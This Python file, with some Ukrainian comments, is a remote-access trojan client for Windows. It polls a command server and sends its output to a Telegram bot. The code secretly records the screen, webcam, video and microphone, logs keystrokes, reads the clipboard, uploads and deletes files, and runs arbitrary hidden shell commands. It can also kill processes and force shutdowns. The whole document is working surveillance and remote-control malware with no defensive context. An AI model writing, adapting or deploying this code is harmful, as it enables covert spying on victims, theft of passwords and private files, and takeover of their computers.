import cv2
import pyautogui
import requests
import io
import os
import sys
import time
import subprocess
import platform
import psutil
import tempfile
import threading
import socket
from datetime import datetime
from pathlib import Path

BOT_TOKEN   = "PLACEHOLDER_TOKEN"
CHAT_ID     = "PLACEHOLDER_CHATID"
PC_NAME     = "PLACEHOLDER_PCNAME"
SERVER_URL  = "PLACEHOLDER_SERVER"

BASE_TG = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ───────────────────────── Тригери ──────────────────────────────────
CPU_ALERT_THRESHOLD = 90      # % CPU для алерту
keylog_buffer = []
keylog_active = False


# ───────────────────────── Helpers ──────────────────────────────────

def run_hidden(cmd: str) -> None:
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    subprocess.Popen(cmd, shell=True, startupinfo=si,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def run_cmd(cmd: str, timeout: int = 10) -> str:
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout, startupinfo=si,
            encoding="cp866", errors="replace"
        )
        return result.stdout.strip() or result.stderr.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "Timeout"
    except Exception as e:
        return f"Error: {e}"


# ───────────────────────── Telegram senders ─────────────────────────

def send_message(text: str, parse_mode="Markdown") -> None:
    try:
        requests.post(f"{BASE_TG}/sendMessage", json={
            "chat_id": CHAT_ID,
            "text": text,
            "parse_mode": parse_mode,
        }, timeout=10)
    except Exception:
        pass


def send_photo_tg(image_bytes: bytes, caption: str = "") -> None:
    requests.post(f"{BASE_TG}/sendPhoto", data={
        "chat_id": CHAT_ID, "caption": caption
    }, files={"photo": ("photo.jpg", image_bytes, "image/jpeg")}, timeout=15)


def send_audio_tg(file_path: str, caption: str = "") -> None:
    with open(file_path, "rb") as f:
        requests.post(f"{BASE_TG}/sendAudio", data={
            "chat_id": CHAT_ID, "caption": caption
        }, files={"audio": ("audio.wav", f, "audio/wav")}, timeout=30)


def send_video_tg(file_path: str, caption: str = "") -> None:
    with open(file_path, "rb") as f:
        requests.post(f"{BASE_TG}/sendVideo", data={
            "chat_id": CHAT_ID, "caption": caption
        }, files={"video": ("video.mp4", f, "video/mp4")}, timeout=60)


def send_document_tg(file_path: str, caption: str = "") -> None:
    with open(file_path, "rb") as f:
        name = os.path.basename(file_path)
        requests.post(f"{BASE_TG}/sendDocument", data={
            "chat_id": CHAT_ID, "caption": caption
        }, files={"document": (name, f)}, timeout=60)


def poll_server():
    try:
        r = requests.get(f"{SERVER_URL}/poll/{PC_NAME}", timeout=5)
        return r.json().get("task")
    except Exception:
        return None


# ───────────────────────── Media ────────────────────────────────────

def do_screenshot() -> bytes:
    buf = io.BytesIO()
    pyautogui.screenshot().save(buf, format="JPEG", quality=85)
    return buf.getvalue()


def do_webcam() -> bytes | None:
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        return None
    for _ in range(5):
        cam.read()
    ret, frame = cam.read()
    cam.release()
    if not ret:
        return None
    ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
    return bytes(buf) if ok else None


def do_audio(seconds: int = 5) -> str | None:
    try:
        import sounddevice as sd
        import soundfile as sf
        samplerate = 44100
        recording = sd.rec(int(seconds * samplerate), samplerate=samplerate, channels=1, dtype="int16")
        sd.wait()
        tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
        sf.write(tmp.name, recording, samplerate)
        return tmp.name
    except Exception as e:
        send_message(f"[{PC_NAME}] Audio error: `{e}`")
        return None


def do_video(seconds: int = 5) -> str | None:
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return None
        width  = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
        tmp = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
        out = cv2.VideoWriter(tmp.name, cv2.VideoWriter_fourcc(*"mp4v"), 20, (width, height))
        end_time = time.time() + seconds
        while time.time() < end_time:
            ret, frame = cam.read()
            if ret:
                out.write(frame)
        cam.release()
        out.release()
        return tmp.name
    except Exception as e:
        send_message(f"[{PC_NAME}] Video error: `{e}`")
        return None


# ───────────────────────── Keylogger ────────────────────────────────

def start_keylog(seconds: int = 30) -> None:
    global keylog_buffer, keylog_active
    try:
        from pynput import keyboard
        keylog_buffer = []
        keylog_active = True

        def on_press(key):
            try:
                keylog_buffer.append(key.char)
            except AttributeError:
                keylog_buffer.append(f"[{key.name}]")

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        time.sleep(seconds)
        listener.stop()
        keylog_active = False

        text = "".join(str(k) for k in keylog_buffer)
        if text:
            send_message(f"[{PC_NAME}] 🔍 Keylog {seconds}s:\n```\n{text[:3000]}\n```")
        else:
            send_message(f"[{PC_NAME}] Keylog: no keypresses")
    except Exception as e:
        send_message(f"[{PC_NAME}] Keylog error: `{e}`")


def get_clipboard() -> str:
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data[:2000] if data else "(empty)"
    except Exception as e:
        return f"Error: {e}"


# ───────────────────────── Files ────────────────────────────────────

def do_ls(path: str = "C:\\") -> str:
    try:
        p = Path(path)
        if not p.exists():
            return f"Path not found: {path}"
        items = list(p.iterdir())[:50]
        lines = [f"`{path}`\n"]
        for item in items:
            size = ""
            try:
                if item.is_file():
                    size = f" ({item.stat().st_size // 1024} KB)"
            except Exception:
                pass
            icon = "📁" if item.is_dir() else "📄"
            lines.append(f"{icon} {item.name}{size}")
        return "\n".join(lines)
    except Exception as e:
        return f"Error: {e}"


def do_download(path: str) -> str | None:
    try:
        p = Path(path)
        if not p.exists():
            return None
        if p.stat().st_size > 50 * 1024 * 1024:
            send_message(f"[{PC_NAME}] File too large (>50MB)")
            return None
        return str(p)
    except Exception as e:
        send_message(f"[{PC_NAME}] Download error: `{e}`")
        return None


def do_delete(path: str) -> str:
    try:
        Path(path).unlink()
        return f"[{PC_NAME}] Deleted: `{path}`"
    except Exception as e:
        return f"[{PC_NAME}] Error: `{e}`"


# ───────────────────────── Network ──────────────────────────────────

def get_ip() -> str:
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        public_ip = requests.get("https://api.ipify.org", timeout=5).text
        return f"[{PC_NAME}]\n🏠 Local IP: `{local_ip}`\n🌐 Public IP: `{public_ip}`"
    except Exception as e:
        return f"Error: {e}"


def get_wifi() -> str:
    output = run_cmd("netsh wlan show networks mode=bssid")
    lines = [l for l in output.split("\n") if "SSID" in l or "Signal" in l or "Authentication" in l]
    return f"[{PC_NAME}] 📶 WiFi networks:\n```\n{chr(10).join(lines[:30])}\n```"


def get_netstat() -> str:
    output = run_cmd("netstat -an | findstr ESTABLISHED")
    return f"[{PC_NAME}] 🌐 Active connections:\n```\n{output[:2000]}\n```"


# ───────────────────────── System ───────────────────────────────────

def do_sysinfo() -> str:
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage("/")
    uptime_sec = int(time.time() - psutil.boot_time())
    h, m = divmod(uptime_sec // 60, 60)
    lines = [
        f"*PC:* `{PC_NAME}`",
        f"*OS:* {platform.system()} {platform.release()}",
        f"*Uptime:* {h}h {m}m",
        f"*CPU:* {cpu}%",
        f"*RAM:* {ram.used // 1024**2} / {ram.total // 1024**2} MB ({ram.percent}%)",
        f"*Disk:* {disk.used // 1024**3} / {disk.total // 1024**3} GB ({disk.percent}%)",
    ]
    try:
        battery = psutil.sensors_battery()
        if battery:
            charging = "⚡ charging" if battery.power_plugged else "🔋"
            lines.append(f"*Battery:* {int(battery.percent)}% {charging}")
    except Exception:
        pass
    top = sorted(psutil.process_iter(["name", "cpu_percent"]),
                 key=lambda p: p.info["cpu_percent"] or 0, reverse=True)[:5]
    lines.append("\n*Top processes:*")
    for p in top:
        lines.append(f"  - {p.info['name']} {p.info['cpu_percent']}%")
    return "\n".join(lines)


def kill_process(name: str) -> str:
    killed = 0
    for proc in psutil.process_iter(["name"]):
        if proc.info["name"].lower() == name.lower():
            try:
                proc.kill()
                killed += 1
            except Exception:
                pass
    return f"[{PC_NAME}] Killed {killed} process(es): `{name}`"


def get_startup() -> str:
    output = run_cmd('reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"')
    return f"[{PC_NAME}] 🚀 Startup:\n```\n{output[:2000]}\n```"


def get_installed() -> str:
    output = run_cmd('wmic product get name,version /format:csv')
    lines = [l for l in output.split("\n") if l.strip() and "Node" not in l][:30]
    return f"[{PC_NAME}] 📦 Installed apps:\n```\n{chr(10).join(lines)}\n```"


def get_active_window() -> str:
    try:
        import win32gui
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        return f"[{PC_NAME}] 🖥️ Active window: `{title}`"
    except Exception as e:
        return f"[{PC_NAME}] Error: `{e}`"


def get_processes() -> str:
    procs = sorted(psutil.process_iter(["name", "cpu_percent", "memory_info"]),
                   key=lambda p: p.info["cpu_percent"] or 0, reverse=True)[:20]
    lines = [f"{'Name':<30} {'CPU':>6} {'RAM':>8}"]
    lines.append("-" * 48)
    for p in procs:
        try:
            ram_mb = p.info["memory_info"].rss // 1024 // 1024
            lines.append(f"{p.info['name'][:30]:<30} {p.info['cpu_percent']:>5}% {ram_mb:>6}MB")
        except Exception:
            pass
    return f"[{PC_NAME}] 📋 Processes:\n```\n{chr(10).join(lines)}\n```"


def volume_change(delta: int) -> str:
    key = "175" if delta > 0 else "174"
    run_hidden(f'powershell -c "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys([char]{key})"')
    return f"[{PC_NAME}] {'volume +10%' if delta > 0 else 'volume -10%'}"


def volume_mute() -> str:
    run_hidden('powershell -c "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys([char]173)"')
    return f"[{PC_NAME}] Muted"


def lock_screen() -> str:
    run_hidden("rundll32.exe user32.dll,LockWorkStation")
    return f"[{PC_NAME}] Locked"


def open_url(url: str) -> str:
    if not url.startswith("http"):
        url = "https://" + url
    import webbrowser
    webbrowser.open(url)
    return f"[{PC_NAME}] Opened: {url}"


def power_action(action: str) -> str:
    cmds = {
        "sleep":    "rundll32.exe powrprof.dll,SetSuspendState 0,1,0",
        "restart":  "shutdown /r /t 5",
        "shutdown": "shutdown /s /t 5",
    }
    cmd = cmds.get(action)
    if cmd:
        run_hidden(cmd)
    return f"[{PC_NAME}] {action} done"


def parse_seconds(args: str, default: int = 5) -> int:
    try:
        return max(1, min(int(args.strip()), 60))
    except Exception:
        return default


# ───────────────────────── Triggers (background) ────────────────────

def trigger_loop():
    """Фоновий цикл — CPU алерти."""
    cpu_alerted = False

    while True:
        try:
            cpu = psutil.cpu_percent(interval=2)
            if cpu >= CPU_ALERT_THRESHOLD and not cpu_alerted:
                send_message(f"🔥 [{PC_NAME}] CPU ALERT: {cpu}%")
                cpu_alerted = True
            elif cpu < CPU_ALERT_THRESHOLD - 10:
                cpu_alerted = False
        except Exception:
            pass
        time.sleep(5)


# ───────────────────────── Command handler ───────────────────────────

def handle(cmd: str, args: str) -> None:
    now = datetime.now().strftime("%H:%M:%S")

    # Media
    if cmd == "/screenshot":
        send_photo_tg(do_screenshot(), f"[{PC_NAME}] Screenshot {now}")

    elif cmd == "/webcam":
        data = do_webcam()
        if data:
            send_photo_tg(data, f"[{PC_NAME}] Webcam {now}")
        else:
            send_message(f"[{PC_NAME}] Webcam not found")

    elif cmd == "/audio":
        seconds = parse_seconds(args, 5)
        send_message(f"[{PC_NAME}] 🎤 Recording {seconds}s...")
        path = do_audio(seconds)
        if path:
            send_audio_tg(path, f"[{PC_NAME}] Audio {seconds}s • {now}")
            os.remove(path)

    elif cmd == "/video":
        seconds = parse_seconds(args, 5)
        send_message(f"[{PC_NAME}] 🎥 Recording {seconds}s...")
        path = do_video(seconds)
        if path:
            send_video_tg(path, f"[{PC_NAME}] Video {seconds}s • {now}")
            os.remove(path)

    # Keylogger
    elif cmd == "/keylog":
        seconds = parse_seconds(args, 30)
        send_message(f"[{PC_NAME}] 🔍 Keylogging {seconds}s...")
        threading.Thread(target=start_keylog, args=(seconds,), daemon=True).start()

    elif cmd == "/clipboard":
        text = get_clipboard()
        send_message(f"[{PC_NAME}] 📋 Clipboard:\n```\n{text}\n```")

    elif cmd == "/activewindow":
        send_message(get_active_window())

    # Files
    elif cmd == "/ls":
        path = args.strip() if args else "C:\\"
        send_message(do_ls(path))

    elif cmd == "/download":
        if args:
            path = do_download(args.strip())
            if path:
                send_document_tg(path, f"[{PC_NAME}] {args.strip()}")
        else:
            send_message(f"Usage: /download {PC_NAME} C:\\file.txt")

    elif cmd == "/delete":
        if args:
            send_message(do_delete(args.strip()))
        else:
            send_message(f"Usage: /delete {PC_NAME} C:\\file.txt")

    # Network
    elif cmd == "/ip":
        send_message(get_ip())

    elif cmd == "/wifi":
        send_message(get_wifi())

    elif cmd == "/netstat":
        send_message(get_netstat())

    # System
    elif cmd == "/sysinfo":
        send_message(do_sysinfo())

    elif cmd == "/processes":
        send_message(get_processes())

    elif cmd == "/kill":
        if args:
            send_message(kill_process(args.strip()))
        else:
            send_message(f"Usage: /kill {PC_NAME} chrome.exe")

    elif cmd == "/startup":
        send_message(get_startup())

    elif cmd == "/installed":
        send_message(get_installed())

    # Volume
    elif cmd == "/volume_up":
        send_message(volume_change(+10))

    elif cmd == "/volume_down":
        send_message(volume_change(-10))

    elif cmd == "/mute":
        send_message(volume_mute())

    # Terminal / browser
    elif cmd == "/run":
        send_message(f"[{PC_NAME}] `{args}`\n```\n{run_cmd(args)[:2000]}\n```" if args else f"Usage: /run {PC_NAME} ipconfig")

    elif cmd == "/open":
        send_message(open_url(args) if args else f"Usage: /open {PC_NAME} google.com")

    # Power
    elif cmd == "/lock":
        send_message(lock_screen())

    elif cmd == "/sleep":
        send_message(f"[{PC_NAME}] Sleeping...")
        power_action("sleep")

    elif cmd == "/restart":
        send_message(f"[{PC_NAME}] Restarting in 5s...")
        power_action("restart")

    elif cmd == "/shutdown":
        send_message(f"[{PC_NAME}] Shutting down in 5s...")
        power_action("shutdown")

    elif cmd == "/stop":
        send_message(f"[{PC_NAME}] Stopped.")
        sys.exit(0)

    else:
        send_message(f"[{PC_NAME}] Unknown: `{cmd}`")


# ───────────────────────── Main ─────────────────────────────────────

def main():
    print(f"Client started as [{PC_NAME}]")
    print(f"Server: {SERVER_URL}")

    # Запуск фонових тригерів
    threading.Thread(target=trigger_loop, daemon=True).start()

    send_message(f"✅ `{PC_NAME}` online - {datetime.now().strftime('%H:%M:%S')}")

    while True:
        try:
            task = poll_server()
            if task:
                cmd  = task.get("cmd", "")
                args = task.get("args", "")
                print(f"CMD: {cmd} args: {args}")
                try:
                    handle(cmd, args)
                except Exception as e:
                    send_message(f"[{PC_NAME}] Error: `{e}`")
        except Exception as e:
            print(f"Poll error: {e}")
        time.sleep(1)


if __name__ == "__main__":
    main()
